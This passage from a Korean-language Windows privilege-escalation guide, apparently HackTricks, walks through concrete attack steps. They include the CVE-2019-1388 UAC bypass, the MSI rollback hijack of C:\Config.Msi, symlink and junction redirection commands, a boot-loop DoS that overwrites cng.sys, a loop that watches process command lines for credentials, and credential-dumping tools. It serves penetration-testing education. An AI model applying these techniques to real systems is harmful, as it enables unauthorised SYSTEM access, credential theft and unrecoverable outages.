user로 shell을 획득하면 **command line에서 credential을 전달하는** scheduled task 또는 기타 process가 실행 중일 수 있습니다. 아래 script는 2초마다 process command line을 capture하고 현재 state를 이전 state와 비교하여 차이점을 출력합니다.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## 프로세스에서 password 훔치기

## Low Priv User에서 NT\AUTHORITY SYSTEM으로 (CVE-2019-1388) / UAC Bypass

그래픽 인터페이스(console 또는 RDP)를 사용할 수 있고 UAC가 활성화되어 있다면, 일부 Microsoft Windows 버전에서는 권한이 없는 사용자로 terminal 또는 "NT\AUTHORITY SYSTEM"과 같은 다른 프로세스를 실행할 수 있습니다.

이를 통해 동일한 vulnerability로 privileges를 escalate하고 UAC를 동시에 우회할 수 있습니다. 또한 아무것도 설치할 필요가 없으며, 이 과정에서 사용되는 binary는 Microsoft에서 서명하고 발급한 것입니다.

영향을 받는 일부 시스템은 다음과 같습니다:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
이 취약점을 exploit하려면 다음 단계를 수행해야 합니다:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
저장소에 필요한 모든 파일과 정보가 있습니다:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Administrator Medium에서 High Integrity Level로 / UAC Bypass

**Integrity Levels**를 학습하려면 다음 문서를 읽으세요:


{{#ref}}
integrity-levels.md
{{#endref}}

그런 다음 **UAC 및 UAC bypasses**를 학습하려면 다음 문서를 읽으세요:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## 임의 폴더 삭제/이동/이름 변경에서 SYSTEM EoP로

[**이 블로그 게시물**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)에 설명된 technique이며, exploit code는 [**여기에서 확인할 수 있습니다**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

이 attack은 기본적으로 Windows Installer의 rollback 기능을 악용하여 uninstallation 과정에서 정상 파일을 악성 파일로 교체합니다. 이를 위해 attacker는 **malicious MSI installer**를 생성해야 합니다. 이 installer는 `C:\Config.Msi` 폴더를 hijack하는 데 사용되며, 이후 Windows Installer가 다른 MSI package를 uninstallation할 때 rollback files를 저장하는 데 사용됩니다. 이 rollback files에는 malicious payload가 포함되도록 수정됩니다.

요약된 technique은 다음과 같습니다.

1. **Stage 1 – Hijack 준비 (`C:\Config.Msi`를 비워 둠)**

- Step 1: MSI 설치
- writable folder(`TARGETDIR`)에 무해한 파일(예: `dummy.txt`)을 설치하는 `.msi`를 생성합니다.
- **"UAC Compliant"**로 installer를 표시하여 **non-admin user**가 실행할 수 있도록 합니다.
- 설치 후에도 파일에 대한 **handle**을 열어 둡니다.

- Step 2: Uninstall 시작
- 동일한 `.msi`를 uninstall합니다.
- uninstall process가 파일을 `C:\Config.Msi`로 이동하고 `.rbf` files(rollback backups)로 이름을 변경하기 시작합니다.
- `GetFinalPathNameByHandle`을 사용하여 **open file handle을 poll**하고, 파일이 `C:\Config.Msi\<random>.rbf`가 되는 시점을 감지합니다.

- Step 3: Custom Syncing
- `.msi`에는 다음을 수행하는 **custom uninstall action(`SyncOnRbfWritten`)**이 포함됩니다.
- `.rbf`가 작성되었음을 signal합니다.
- 그런 다음 uninstall이 계속되기 전에 다른 event를 **wait**합니다.

- Step 4: `.rbf` 삭제 차단
- signal을 받으면 `FILE_SHARE_DELETE` 없이 **`.rbf` 파일을 open**합니다. 이렇게 하면 **파일이 삭제되지 않습니다**.
- 그런 다음 uninstall이 완료될 수 있도록 다시 **signal**합니다.
- Windows Installer는 `.rbf`를 삭제하지 못하며, 모든 contents를 삭제할 수 없기 때문에 **`C:\Config.Msi`가 제거되지 않습니다**.

- Step 5: `.rbf` 수동 삭제
- (attacker인) 사용자가 `.rbf` 파일을 수동으로 삭제합니다.
- 이제 **`C:\Config.Msi`가 비어 있으며**, hijack할 준비가 됩니다.

> 이 시점에서 **SYSTEM-level arbitrary folder delete vulnerability**를 trigger하여 `C:\Config.Msi`를 삭제합니다.

2. **Stage 2 – Rollback Scripts를 악성 파일로 교체**

- Step 6: Weak ACLs로 `C:\Config.Msi` 재생성
- `C:\Config.Msi` 폴더를 직접 다시 생성합니다.
- **weak DACLs**(예: Everyone:F)를 설정하고 `WRITE_DAC` 권한으로 **handle을 열어 둡니다**.

- Step 7: 다른 Install 실행
- 다음 설정으로 `.msi`를 다시 install합니다.
- `TARGETDIR`: Writable location.
- `ERROROUT`: 강제 failure를 trigger하는 variable.
- 이 install은 다시 **rollback**을 trigger하는 데 사용되며, `.rbs`와 `.rbf`를 읽습니다.

- Step 8: `.rbs` 모니터링
- `ReadDirectoryChangesW`를 사용하여 새 `.rbs`가 나타날 때까지 `C:\Config.Msi`를 모니터링합니다.
- 파일 이름을 기록합니다.

- Step 9: Rollback 전 Sync
- `.msi`에는 다음을 수행하는 **custom install action(`SyncBeforeRollback`)**이 포함됩니다.
- `.rbs`가 생성되면 event를 signal합니다.
- 그런 다음 계속 진행하기 전에 **wait**합니다.

- Step 10: Weak ACL 재적용
- `.rbs created` event를 받은 후:
- Windows Installer가 `C:\Config.Msi`에 **strong ACLs를 다시 적용**합니다.
- 하지만 여전히 `WRITE_DAC` 권한의 handle을 보유하고 있으므로 **weak ACLs를 다시 적용**할 수 있습니다.

> ACLs는 **handle open 시점에만 적용**되므로, 여전히 folder에 write할 수 있습니다.

- Step 11: 가짜 `.rbs` 및 `.rbf` 삽입
- `.rbs` 파일을 **fake rollback script**로 overwrite하여 Windows에 다음을 지시합니다.
- 사용자의 `.rbf` 파일(malicious DLL)을 **privileged location**(예: `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`)으로 restore합니다.
- **malicious SYSTEM-level payload DLL**이 포함된 fake `.rbf`를 삽입합니다.

- Step 12: Rollback trigger
- installer가 resume하도록 sync event를 signal합니다.
- **type 19 custom action(`ErrorOut`)**은 알려진 지점에서 install을 **의도적으로 fail**하도록 구성되어 있습니다.
- 이로 인해 **rollback이 시작**됩니다.

- Step 13: SYSTEM이 DLL 설치
- Windows Installer가 다음을 수행합니다.
- malicious `.rbs`를 읽습니다.
- `.rbf` DLL을 target location으로 copy합니다.
- 이제 **SYSTEM이 load하는 path에 malicious DLL이 존재**하게 됩니다.

- Final Step: SYSTEM Code 실행
- hijack한 DLL을 load하는 trusted **auto-elevated binary**(예: `osk.exe`)를 실행합니다.
- **Boom**: code가 **SYSTEM 권한으로 실행**됩니다.


### 임의 파일 삭제/이동/이름 변경에서 SYSTEM EoP로

주요 MSI rollback technique(앞의 technique)는 **entire folder**(예: `C:\Config.Msi`)를 삭제할 수 있다고 가정합니다. 하지만 vulnerability가 **arbitrary file deletion**만 허용한다면 어떻게 해야 할까요?

**NTFS internals**를 exploit할 수 있습니다. 모든 folder에는 다음과 같은 hidden alternate data stream이 있습니다:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
이 stream에는 폴더의 **index metadata**가 저장됩니다.

따라서 폴더의 **`::$INDEX_ALLOCATION` stream**을 **삭제**하면 NTFS는 파일시스템에서 **전체 폴더를 제거**합니다.

다음과 같은 표준 파일 삭제 API를 사용하여 이를 수행할 수 있습니다:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> 파일 삭제 API를 호출하고 있더라도 **폴더 자체를 삭제합니다**.

### 폴더 내용 삭제에서 SYSTEM EoP로
primitive이 임의의 파일/폴더를 삭제하도록 허용하지 않지만, **공격자가 제어하는 폴더의 *내용* 삭제는 허용**한다면 어떻게 될까요?

1. Step 1: 미끼 폴더와 파일 설정
- 생성: `C:\temp\folder1`
- 그 안에 생성: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt`에 **oplock** 설정
- oplock은 권한이 높은 프로세스가 `file1.txt`를 삭제하려고 할 때 **실행을 일시 중지**합니다.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. 단계 3: SYSTEM 프로세스 트리거 (예: `SilentCleanup`)
- 이 프로세스는 폴더(예: `%TEMP%`)를 스캔하고 해당 폴더의 내용을 삭제하려고 시도합니다.
- `file1.txt`에 도달하면 **oplock이 트리거**되고 제어권이 callback으로 넘어갑니다.

4. 단계 4: oplock callback 내부 - 삭제 리디렉션

- 옵션 A: `file1.txt`를 다른 위치로 이동
- 이렇게 하면 oplock을 해제하지 않고 `folder1`을 비웁니다.
- `file1.txt`를 직접 삭제하지 마세요. 그러면 oplock이 조기에 해제됩니다.

- 옵션 B: `folder1`을 **junction**으로 변환:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Option C: `\RPC Control`에 **symlink**를 생성합니다:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> 이는 폴더 메타데이터를 저장하는 NTFS 내부 stream을 대상으로 하며 — 이를 삭제하면 폴더가 삭제됩니다.

5. Step 5: oplock 해제
- SYSTEM 프로세스가 계속 실행되며 `file1.txt`를 삭제하려고 합니다.
- 하지만 이제 junction + symlink로 인해 실제로 삭제되는 것은 다음과 같습니다:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**결과**: `C:\Config.Msi`가 SYSTEM에 의해 삭제됩니다.

### 임의 폴더 생성에서 영구적인 DoS까지

**파일을 쓸 수 없거나** **weak permissions를 설정할 수 없더라도**, **SYSTEM/admin 권한으로 임의의 폴더를 생성할 수 있게 하는 primitive**를 exploit합니다.

**critical Windows driver**의 이름을 사용하는 **파일이 아닌 폴더**를 생성합니다. 예:
```
C:\Windows\System32\cng.sys
```
- 이 경로는 일반적으로 `cng.sys` kernel-mode driver에 해당합니다.
- 이를 **folder로 미리 생성하면**, Windows가 boot 시 실제 driver를 load하지 못합니다.
- 그러면 Windows는 boot 중 `cng.sys`를 load하려고 합니다.
- folder를 발견하고 **실제 driver를 resolve하지 못한 뒤**, **crash가 발생하거나 boot가 중단**됩니다.
- **fallback이 없으며**, 외부 개입(예: boot repair 또는 disk access) 없이는 **recovery할 수 없습니다**.

### privileged log/backup paths + OM symlinks에서 arbitrary file overwrite / boot DoS까지

**privileged service**가 **writable config**에서 읽은 path에 logs/exports를 쓸 때, **Object Manager symlinks + NTFS mount points**를 사용해 해당 path를 redirect하면 privileged write를 arbitrary overwrite로 전환할 수 있습니다(**SeCreateSymbolicLinkPrivilege 없이도** 가능).<sup>[[15]](#references)</sup>

**Requirements**
- target path를 저장하는 config가 attacker에게 writable이어야 합니다(예: `%ProgramData%\...\.ini`).
- `\RPC Control`에 mount point와 OM file symlink를 생성할 수 있어야 합니다(James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- 해당 path에 write하는 privileged operation(log, export, report).

**Example chain**
1. config를 읽어 privileged log destination을 확인합니다. 예: `C:\ProgramData\ICONICS\IcoSetup64.ini`에 있는 `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`.
2. admin 없이 path를 redirect합니다:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. 권한이 있는 구성 요소가 log를 작성할 때까지 기다립니다(예: 관리자가 "send test SMS"를 트리거). 이제 write가 `C:\Windows\System32\cng.sys`에 수행됩니다.
4. 덮어쓴 target을 검사하여(hex/PE parser 사용) 손상을 확인합니다. 재부팅하면 Windows가 변조된 driver 경로를 load하게 되어 → **boot loop DoS**가 발생합니다. 이는 권한이 있는 service가 write를 위해 열게 될 모든 protected file에도 동일하게 적용할 수 있습니다.

> `cng.sys`는 일반적으로 `C:\Windows\System32\drivers\cng.sys`에서 load되지만, `C:\Windows\System32\cng.sys`에 copy가 존재하면 해당 경로가 먼저 시도될 수 있으므로, 손상된 data를 주입하는 안정적인 DoS sink가 될 수 있습니다.



## **High Integrity에서 System으로**

### **새 service**

이미 High Integrity process에서 실행 중이라면, 새 service를 **생성하고 실행하는 것만으로** **SYSTEM으로 가는 경로**를 쉽게 확보할 수 있습니다:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> service binary를 생성할 때 유효한 service인지 또는 binary가 필요한 작업을 신속하게 수행하는지 확인하세요. 유효한 service가 아니면 20초 후 종료되기 때문입니다.

### AlwaysInstallElevated

High Integrity process에서 **AlwaysInstallElevated registry entries를 활성화**한 다음 _**.msi**_ wrapper를 사용해 reverse shell을 **설치**할 수 있습니다.\
[관련 registry keys 및 _.msi_ package 설치 방법에 대한 자세한 정보는 여기에서 확인할 수 있습니다.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**[여기에서 code를 확인할 수 있습니다](seimpersonate-from-high-to-system.md).**

### From SeDebug + SeImpersonate to Full Token privileges

해당 token privileges가 있으면(이미 High Integrity process에서 발견할 가능성이 높음) SeDebug privilege를 사용해 **거의 모든 process**(protected processes 제외)를 **열고**, 해당 process의 **token을 복사**한 후 그 token으로 **임의의 process를 생성**할 수 있습니다.\
이 technique에서는 일반적으로 **모든 token privileges를 가진 SYSTEM으로 실행 중인 process를 선택**합니다(_모든 token privileges가 없는 SYSTEM process도 찾을 수 있습니다_).\
**제안된 technique을 실행하는 code 예제는** [**여기에서 확인할 수 있습니다**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

이 technique은 meterpreter가 `getsystem`에서 privilege escalation을 수행할 때 사용됩니다. 이 technique은 **pipe를 생성한 다음 해당 pipe에 write할 service를 생성하거나 abuse하는 것**으로 구성됩니다. 그런 다음 **`SeImpersonate`** privilege를 사용해 pipe를 생성한 **server**는 pipe client(service)의 **token을 impersonate**하여 SYSTEM privileges를 획득할 수 있습니다.\
name pipes에 대해 [**더 알아보려면 이 문서를 읽어보세요**](#named-pipe-client-impersonation).\
name pipes를 사용해 high integrity에서 System으로 이동하는 [**방법의 예제를 보려면 이 문서를 읽어보세요**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

**SYSTEM**으로 실행 중인 **process**가 **load**하는 **dll을 hijack**할 수 있다면 해당 permissions으로 임의의 code를 실행할 수 있습니다. 따라서 Dll Hijacking은 이러한 종류의 privilege escalation에도 유용하며, **dll을 load하는 데 사용되는 folder에 write permissions**가 있으므로 **high integrity process에서 훨씬 더 쉽게 수행**할 수 있습니다.\
**[여기에서 Dll hijacking에 대해 더 알아볼 수 있습니다](dll-hijacking/index.html).**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Windows local privilege escalation vectors를 확인하는 최고의 tool:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- misconfigurations 및 sensitive files 확인 (**[**여기에서 확인**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- 일부 가능한 misconfigurations를 확인하고 정보를 수집 (**[**여기에서 확인**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- misconfigurations 확인**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla 및 RDP saved session information을 추출합니다. local에서는 -Thorough를 사용합니다.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager에서 credentials를 추출합니다. Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 수집한 passwords를 domain 전체에 spray합니다.**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh는 PowerShell ADIDNS/LLMNR/mDNS spoofer이자 man-in-the-middle tool입니다.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- 기본적인 Windows privesc enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- 알려진 privesc vulnerabilities 검색(Watson에 의해 DEPRECATED)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local checks **(Admin rights 필요)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 알려진 privesc vulnerabilities 검색(VisualStudio를 사용해 compile해야 함) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- misconfigurations를 검색하며 host를 enumerate합니다(privesc보다는 gather info tool에 가까움)(compile해야 함) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 다양한 software에서 credentials를 추출합니다(github에 precompiled exe가 있음)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp을 C#으로 port한 tool**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- misconfiguration 확인(github에 executable precompiled 버전이 있음). 권장하지 않습니다. Win10에서 제대로 작동하지 않습니다.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 가능한 misconfigurations 확인(python 기반 exe). 권장하지 않습니다. Win10에서 제대로 작동하지 않습니다.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- 이 post를 기반으로 생성된 tool입니다(accesschk 없이도 제대로 작동하지만 accesschk를 사용할 수 있습니다).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** output을 읽고 작동하는 exploits를 추천합니다(local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** output을 읽고 작동하는 exploits를 추천합니다(local Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

올바른 .NET version을 사용해 project를 compile해야 합니다([이 문서 참조](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). victim host에 설치된 .NET version을 확인하려면 다음을 실행할 수 있습니다:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## References

- [1] [Windows 권한 상승 기본 사항](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [취약한 폴더 권한을 악용한 권한 상승](http://www.greyhathacker.net/?p=738)
- [3] [Windows 권한 상승 - 치트시트](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Windows / Linux 로컬 권한 상승 Workshop](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Windows 공격: AT가 새로운 black이다 (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [권한 상승 - Windows - 전체 OSCP 가이드](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - 권한 상승 - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Windows 권한 상승 가이드](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Windows-권한-상승 체크리스트](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-권한-상승](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Pentester를 위한 Windows 권한 상승 방법](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: SMTP를 통한 Word VBA macro phishing → hMailServer credential decryption → SYSTEM으로의 Veeam CVE-2023-27532](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) 및 kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Silver Fox 추적: Kernel Shadows에서의 Cat & Mouse](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – SCADA System에 존재하는 Privileged File System Vulnerability](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Symbolic Link Testing Tools – CreateSymlink 사용법](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [과거로 연결되는 링크. Windows에서 Symbolic Links 악용하기](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: Windows에서의 Dangerous Module Resolution](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js modules: `node_modules` 폴더에서 loading](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - C/C++ checklist challenges, solved](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - RtlQueryRegistryValues function](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own with Microslop: Windows LPE를 위한 CLDFLT 및 DirectX Kernel Race Conditions chaining](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [One I/O Ring to Rule Them All: Windows 11에서의 Full Read/Write Exploit Primitive](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Arbitrary File Deletes를 악용하여 권한 상승 및 기타 훌륭한 Tricks 수행하기](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - FilesystemEoPs exploit code](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS Attacks Part 2: CVE-2020-1013, Windows 10 Local Privilege Escalation 1-Day](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Credential Manager 및 Windows Vault 살펴보기](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberos Resource Based Constrained Delegation: Image Change가 Privilege Escalation으로 이어지는 경우](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Windows 10 Ssh Agent에서 Ssh Private Keys 추출하기](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Enterprise Update Servers를 Backdoor Factories로 전환하기 (0_o) – Part 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Enterprise Update Servers를 Backdoor Factories로 전환하기 (0_o) – Part 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
{{#include ../../banners/hacktricks-training.md}}
